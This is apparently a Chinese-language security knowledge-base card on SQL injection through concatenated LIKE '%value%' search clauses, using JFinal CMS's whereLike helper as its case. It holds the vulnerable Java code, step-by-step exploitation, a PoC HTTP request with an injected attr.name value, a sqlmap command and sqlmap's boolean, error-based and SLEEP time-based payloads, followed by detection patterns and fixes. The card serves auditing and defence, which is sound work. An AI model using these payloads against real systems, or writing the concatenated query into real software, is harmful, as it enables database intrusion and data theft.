---
id: web-generic-sqli-like-clause-append-search
title: 搜索接口 LIKE '%value%' 字符串拼接导致 SQL 注入
type: scenario
domain: web
path: web/generic/sqli
technique: sqli-like-clause-concatenation
aliases:
- LIKE 注入
- 模糊查询 SQL 注入
- whereLike 注入
- 搜索框注入
- JFinal SQL 注入
tags:
- sqli
- like
- java
- jfinal
- code-audit
- sqlmap
- mysql
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V11
  verified_at: '2026-11-05T01:20:05+08:00'
  notes: 已对照原文及图5-8核对：whereLike 将 value 直接 append 进 LIKE '%...%'，实际SQL为 AND t.name LIKE '%66%'，sqlmap 对 attr.name 确认 boolean/error/time-based，MySQL>=5.0、root@localhost。原文未给手工逐位提取；版本为测试环境 jfinal_cms-4.5.0，非声明影响区间。
---

## 一句话结论

搜索接口把用户输入拼进 `LIKE '%值%'` 的字符串字面量（如 JFinal 的 `whereLike` 用 `append(value)` 而非参数绑定）时，输入中的单引号会闭合模式串并注入任意 SQL；外层包了 `%` 和引号并不等于安全。

## 原理

- 有漏洞的 helper：
  ```java
  this.sqlBuffer.append(" AND " + this.getAttrName(attrName)
      + " LIKE '%").append(value).append("%'");
  ```
  `value` 直接进入 SQL 文本。攻击者输入 `66' OR 1=1#` 时，生成的 SQL 变为 `... AND t.name LIKE '%66' OR 1=1#%'`，引号被闭合，注释符吞掉尾部。
- `LIKE` 的参数仍然是“值”位置，但“值”必须作为绑定参数传递（如 `LIKE CONCAT('%', ?, '%')`），而不是由应用拼字符串加上引号；SQL 的引号规则由数据库解析，应用拼接无法保证转义。
- JFinal 的 `SqlUtils/whereLike` 只是提供了拼接便利，等价于手写 `" LIKE '%" + value + "%'"`；审计时应把所有类似的搜索条件、模糊查询、`%${}` 写法列为污点 sink。
- 外层 `%` 只影响匹配模式，不阻止注入；输入中的 `'`、`)`、`--`、`#` 仍可改变语法。
- 本例数据库为 MySQL，sqlmap 确认存在 boolean-based blind、error-based（FLOOR/RAND）、time-based 三类注入，当前数据库用户为 `root@localhost`，危害进一步放大。

## 触发条件

- 搜索/列表接口把用户输入拼进 `LIKE '%...%'` 字符串；
- 输入未参数化、未做严格白名单/转义（或转义实现有缺陷）；
- 攻击者可访问该接口并控制搜索关键字；
- 数据库错误信息或响应差异可用于注入判定；本例为 MySQL ≥ 5.0。

## 利用步骤

1. 代码审计搜索 `LIKE '%`、`whereLike`、`%${`、`in ${` 等拼接写法，确认值来自请求参数。
2. 抓取搜索请求，对关键字参数依次提交 `'`、`''`、`' AND 1=1#`、`' AND 1=2#`，观察报错/结果差异。
3. 用 sqlmap 验证：`sqlmap -r request.txt -p attr.name --batch --dbs`。
4. 确认注入类型（布尔/报错/时间盲注）后提取表名、列名与数据。
5. 若 orderBy 等参数也被直接 `append`，一并测试标识符位置注入（见关联卡）。

## PoC

```http
POST /jfinal_cms/admin/friendlylink/list HTTP/1.1
Content-Type: application/x-www-form-urlencoded

attr.name=66' AND 1=1#&pageNo=1&pageSize=20
```

拼接后的 SQL：

```sql
from tb_friendlylink t left join tb_site s on s.id = t.site_id
where 1=1  AND t.name LIKE '%66' AND 1=1#%'
```

sqlmap 验证结果（摘录）：

```text
Parameter: attr.name (POST)
    Type: boolean-based blind
    Payload: attr.name=66' AND 2786=2786#
    Type: error-based
    Payload: attr.name=66' AND (SELECT 9196 FROM(SELECT COUNT(*),CONCAT(...FLOOR(RAND(0)*2))...))
    Type: time-based blind
    Payload: attr.name=66' AND (SELECT 6575 FROM (SELECT(SLEEP(5)))...)
back-end DBMS: MySQL >= 5.0
current user: 'root@localhost'
```

## 变体与关联

- 变体：MyBatis `LIKE '%${keyword}%'`、Hibernate HQL 字符串拼接、JPA `createQuery` 拼接，均属值位置未参数化。
- 变体：同文件 `sql.append(" order by ").append(orderBy)` 属标识符位置注入，见 [[web-generic-sqli-java-identifier-table-order-by-injection]]。
- 变体：`in (${ids})`、动态表名、动态列名同样无法用 `?` 绑定。
- 关联：[[web-generic-sqli-mybatis-dollar-brace-injection]]（`${}` 文本替换）；[[web-generic-sqli-blind-filter-bypass-functions]]（盲注函数与过滤绕过）。
- 注意：原文仅在代码层面 + sqlmap 验证，未提供手工逐位提取过程。

## 检测与防御

- 检测：代码审计 grep `LIKE '%`、`whereLike`、`%${`、`in ${`、`append(orderBy)`；SAST 标记所有字符串拼接进 SQL 的污点路径。
- 检测：WAF/日志中出现 `LIKE '%` 参数内含 `'`、`#`、`--`、`SLEEP(`、`FLOOR(RAND` 等模式；同一搜索参数短时间高频布尔/时间探测。
- 防御：所有值使用预编译参数，LIKE 写成 `LIKE CONCAT('%', ?, '%')`（MySQL）或 `LIKE ?` 并在代码侧拼接 `%` 后绑定。
- 防御：动态表名/列名/排序字段使用严格白名单映射，不拼接用户输入；分页参数强类型化。
- 防御：数据库账号最小权限（本例 root 属高危配置），关闭详细错误回显。
